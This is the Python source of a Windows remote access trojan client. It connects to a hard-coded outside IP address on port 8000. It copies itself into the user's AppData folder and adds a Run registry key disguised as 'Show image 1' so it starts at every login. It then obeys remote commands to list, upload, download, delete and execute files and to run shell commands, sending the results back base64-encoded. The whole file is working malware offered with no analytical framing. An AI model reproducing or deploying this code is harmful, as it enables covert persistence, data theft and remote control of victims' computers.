import os, sys, base64, socket, shutil, subprocess
from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, OpenKey, SetValueEx


class Client:
    def __init__(self, ip: str, port: int) -> None:
        """
            Initialization function
        """
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((ip, port))
        except Exception as exc:
            print('Exception __init__(): ', exc)
    def addStartup(self, path_file) -> None:
        """
            Adds autoplay to the registry
        """
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key2change, 'Show image 1', 0, REG_SZ, path_file)
    def check_exist_file(self, path_file):
        """
            Check exist file path in the Registry
        """
        return os.path.exists(path_file)
    def copy_file(self) -> None:
        """
            Copy file to 'Roaming' directory
        """
        current_path = os.getcwd()
        file_name = sys.argv[0].split('\\')[-1]
        src_path = f'{current_path}\{file_name}'
        dst_path = f'{os.environ.get("APPDATA")}\{file_name}'
        if self.check_exist_file(dst_path):
            pass
        else:
            shutil.copyfile(src_path, dst_path)
            self.addStartup(dst_path)
    def commands_shell(self, command: str) -> str:
        """
            Run commands shell
        """
        try:
            # EXIT
            if command.lower() == 'exit':
                try:
                    return "break"
                except FileNotFoundError:
                    self.socket.send(b'\n\n\t--- File not found ---')
                except OSError:
                    self.socket.send(b'\n\n\t--- An error has occurred ---')
            # PWD
            elif command.lower() == 'pwd':
                try:
                    current_path = os.getcwd()
                    self.socket.send(base64.b64encode(current_path.encode()))
                    return "continue"
                except FileNotFoundError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            # DIR
            elif command.lower() == 'dir':
                try:
                    files = os.listdir(os.getcwd())
                    current_path = os.getcwd()
                    result = []
                    for file in files:
                        if os.path.isfile(file):
                            result.append(f"\t{file} -- File \n")
                        elif os.path.isdir(file):
                            result.append(f"\t{file} -- Directory \n")
                        else:
                            continue
                
                    mystr = "".join(result)
                    print('mystr: ', mystr)
                    if mystr:
                        CURRENT_PATH = f"\n\nCurrent Files:\n{mystr}\nPath: {current_path}\n".encode()
                    else:
                        CURRENT_PATH = "\n\n\t--- Directory is empty ---".encode()
                    self.socket.send(base64.b64encode(CURRENT_PATH))
                    self.socket.send(base64.b64encode(b"--- End ---"))
                    return "continue"
                except FileNotFoundError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            # CD ..
            elif command.lower() == 'cd ..':
                try:
                    os.chdir('..')
                    self.socket.send(base64.b64encode(b'cd ..'))
                    return "continue"
                except FileNotFoundError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            elif len(command) == 1024:
                try:
                    json_data = f"{command}"
                    current_path = os.getcwd()
                    while True:
                        try:
                            data = self.socket.recv(1024).decode("utf-8", "ignore")
                            json_data = json_data + data

                            if "File upload was successful" in data:
                                with open(f'{current_path}\{"arrays.exe"}', 'wb') as file:
                                    file.write(base64.b64decode(json_data.replace("--- File upload was successful ---", "")))
                                    file.close()
                                self.socket.send(b"--- File upload was successful ---")
                                break
                        except Exception:
                            continue
                except FileNotFoundError:
                    self.socket.send(b'\n\n\t--- File not found ---')
                except OSError:
                    self.socket.send(b'\n\n\t--- An error has occurred ---')
            # MKDIR
            elif 'mkdir' in command.lower():
                try:
                    subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                    self.socket.send(base64.b64encode(b'Directory created successfully'))
                    return "continue"
                except FileNotFoundError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            # RMDIR
            elif 'rmdir' in command.lower():
                try:
                    subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                    self.socket.send(base64.b64encode(b'Directory deleted successfully'))
                    return "continue"
                except FileNotFoundError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            # CD path
            elif 'cd ' in command.lower():
                try:
                    cwd = os.getcwd()
                    directory = command.split()[1]
                    os.chdir(f'{cwd}\{directory}')
                    self.socket.send(base64.b64encode(b'Successful directory change'))
                except FileNotFoundError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            # Create file
            elif 'echo' in command.lower():
                try:
                    subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                    self.socket.send(base64.b64encode(b'File created successfully'))
                    return "continue"
                except FileNotFoundError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            # Remove File
            elif 'del' in command.lower():
                try:
                    filename = command.split()[1]
                    current_path = os.listdir(os.getcwd())
                    if '.' in filename:
                        if filename in current_path:
                            subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                            self.socket.send(base64.b64encode(b'File deleted successfully'))
                            return "continue"
                        else:
                            self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                            return "continue"
                    else:
                        self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                        return "continue"
                except FileNotFoundError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            # GET
            elif 'get' in command.lower():
                try:
                    filename = command.split()[1]
                    current_path = os.listdir(os.getcwd())
                    print('current_path: ', current_path)
                    if '.' in filename:
                        if filename in current_path:
                            with open(filename, 'rb') as file_to_send:
                                file = file_to_send.read()
                                self.socket.send(base64.b64encode(file))
                                file_to_send.close()
                            self.socket.send(b"--- File upload was successful ---")
                            return "continue"
                        else:
                            self.socket.send(b'\n\n\t--- File not found ---')
                            return "continue"
                    else:
                        self.socket.send(b'\n\n\t--- File not found ---')
                        return "continue"
                except FileNotFoundError:
                    self.socket.send(b'\n\n\t--- File not found ---')
                except OSError:
                    self.socket.send(b'\n\n\t--- An error has occurred ---')
            # RUN
            elif 'run' in command.lower():
                try:
                    filename = command.split()[1]
                    current_path = os.listdir(os.getcwd())
                    if '.' in filename:
                        if filename in current_path:
                            filename = command.split()[1]
                            result_command = subprocess.check_output(f'{filename}', shell=True)
                            self.socket.send(base64.b64encode(result_command))
                            return "continue"
                        else:
                            self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                            return "continue"
                    else:
                        self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                        return "continue"
                except FileNotFoundError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- File not found ---'))
                except OSError:
                    self.socket.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
            else:
                self.socket.send(base64.b64encode(b'\n\n\t--- An error has occurred ---'))
                return "continue"
        except Exception as exc:
            print('Exception commands_shell(): ', exc)
    def run(self) -> None:
        """
            Command to connect to the server
        """
        try:
            while 1:
                try:
                    command = self.socket.recv(1024).decode()
                    result = self.commands_shell(command)
                    if result == "break":
                        break
                    else:
                        continue
                except KeyboardInterrupt:
                    self.socket.close()
                    break
            self.socket.close()
        except Exception as exc:
            print('Exception run(): ', exc)


if __name__ == '__main__':
    ip = '185.252.215.82'
    client = Client(ip, 8000)
    client.copy_file()
    client.run()
